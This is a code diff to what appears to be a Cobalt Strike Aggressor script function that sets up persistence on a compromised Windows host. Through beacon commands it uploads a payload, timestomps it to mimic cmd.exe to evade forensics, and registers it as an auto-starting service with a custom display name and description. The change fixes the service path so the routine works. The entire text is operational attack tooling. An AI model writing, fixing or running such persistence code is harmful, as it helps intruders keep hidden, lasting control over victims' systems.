@@ -14,7 +14,7 @@ sub persistCustomService  {
 			bupload($bid, $3['payloadfile']);
 			btimestomp($bid, "$3['payloadfile']", "C:\\Windows\\System32\\cmd.exe");
 			bshell($bid, 'sc delete '.$3['servicename'].'');
-			bshell($bid, 'sc create '.$3['servicename'].' binpath= "'.$3['targetpath'].split("/",$3['payloadfile'])[-1].'" error= ignore start= auto DisplayName= "'.$3['display'].'"');
+			bshell($bid, 'sc create '.$3['servicename'].' binpath= "'.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].'" error= ignore start= auto DisplayName= "'.$3['display'].'"');
 			bshell($bid, 'sc description '.$3['servicename'].' "'.$3['description'].'"');
 			bshell($bid, 'sc start '.$3['servicename'].'');
 		}
